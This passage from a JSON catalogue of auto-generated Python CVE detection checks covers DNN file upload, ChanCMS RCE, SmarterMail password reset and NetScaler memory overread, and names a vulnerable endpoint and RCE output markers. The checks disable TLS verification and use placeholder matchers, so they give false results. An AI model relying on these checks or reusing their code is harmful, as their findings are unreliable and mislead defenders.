extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DNN - Unrestricted Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_64095(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "intrusive",
          "file-upload",
          "dnn",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_8266",
        "name": "ChanCMS <= 3.1. - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "yanyutao0402 ChanCMS <= 3.1.2 contains an insecure deserialization caused by manipulation of the \\\"targetUrl\\\" argument in getArticle function of app/modules/cms/controller/collect.js, letting remote attackers execute arbitrary code, exploit requires crafted input.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains_all(body, \"uid=\", \"gid=\", \"groups=\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-8266\nName: ChanCMS <= 3.1. - Remote Code Execution\nSeverity: critical\nDescription: yanyutao0402 ChanCMS <= 3.1.2 contains an insecure deserialization caused by manipulation of the \\\"targetUrl\\\" argument in getArticle function of app/modules/cms/controller/collect.js, letting remote attackers execute arbitrary code, exploit requires crafted input.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_8266:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-8266\"\n    SEVERITY = \"critical\"\n    NAME = \"ChanCMS <= 3.1. - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body, \"uid=\", \"gid=\", \"groups=\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ChanCMS <= 3.1. - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_8266(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-8266\nName: ChanCMS <= 3.1. - Remote Code Execution\nSeverity: critical\nDescription: yanyutao0402 ChanCMS <= 3.1.2 contains an insecure deserialization caused by manipulation of the \\\"targetUrl\\\" argument in getArticle function of app/modules/cms/controller/collect.js, letting remote attackers execute arbitrary code, exploit requires crafted input.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_8266:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-8266\"\n    SEVERITY = \"critical\"\n    NAME = \"ChanCMS <= 3.1. - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body, \"uid=\", \"gid=\", \"groups=\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ChanCMS <= 3.1. - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_8266(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "chancms",
          "rce",
          "deserialization",
          "intrusive",
          "vuln",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2026_23760",
        "name": "SmarterTools SmarterMail - Admin Password Reset",
        "language": "Python",
        "famille": "CVE",
        "description": "Detected a SmartMail admin password reset vulnerability by sending a POST request to the `/api/v1/auth/force-reset-password` endpoint, indicating that administrative password resets could potentially be triggered without proper authorization.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"success\":true, debugInfo' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{rand_text_alphanumeric(12)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-23760\nName: SmarterTools SmarterMail - Admin Password Reset\nSeverity: critical\nDescription: Detected a SmartMail admin password reset vulnerability by sending a POST request to the `/api/v1/auth/force-reset-password` endpoint, indicating that administrative password resets could potentially be triggered without proper authorization.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_23760:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-23760\"\n    SEVERITY = \"critical\"\n    NAME = \"SmarterTools SmarterMail - Admin Password Reset\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"success\":true, debugInfo\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"success\":true, debugInfo']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SmarterTools SmarterMail - Admin Password Reset\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_23760(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-23760\nName: SmarterTools SmarterMail - Admin Password Reset\nSeverity: critical\nDescription: Detected a SmartMail admin password reset vulnerability by sending a POST request to the `/api/v1/auth/force-reset-password` endpoint, indicating that administrative password resets could potentially be triggered without proper authorization.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_23760:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-23760\"\n    SEVERITY = \"critical\"\n    NAME = \"SmarterTools SmarterMail - Admin Password Reset\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"success\":true, debugInfo\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"success\":true, debugInfo']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SmarterTools SmarterMail - Admin Password Reset\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_23760(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2026",
          "intrusive",
          "smartmail",
          "admin",
          "auth-bypass",
          "vkev",
          "kev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2026_3055",
        "name": "Citrix NetScaler SAML IDP - Memory Overread",
        "language": "Python",
        "famille": "CVE",
        "description": "NetScaler ADC and NetScaler Gateway contain an insufficient input validation vulnerability when configured as a SAML IDP, leading to memory overread, letting attackers potentially access sensitive memory, exploit requires configuration as SAML IDP",
        "severity": "critical",
        "detection": "[AND] DSL: regex('(?i)NSC_TASS=[A-Za-z0-9+/]+=*', set_cookie); status_code == 302",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-3055\nName: Citrix NetScaler SAML IDP - Memory Overread\nSeverity: critical\nDescription: NetScaler ADC and NetScaler Gateway contain an insufficient input validation vulnerability when configured as a SAML IDP, leading to memory overread, letting attackers potentially access sensitive memory, exploit requires configuration as SAML IDP\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_3055:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-3055\"\n    SEVERITY = \"critical\"\n    NAME = \"Citrix NetScaler SAML IDP - Memory Overread\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: regex('(?i)NSC_TASS=[A-Za-z0-9+/]+=*', set_cookie); status_code == 302\"\n\n        # Simple word matcher simulation\n        matchers = ['(?i)NSC_TASS=[A-Za-z0-9+/]+=*']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from 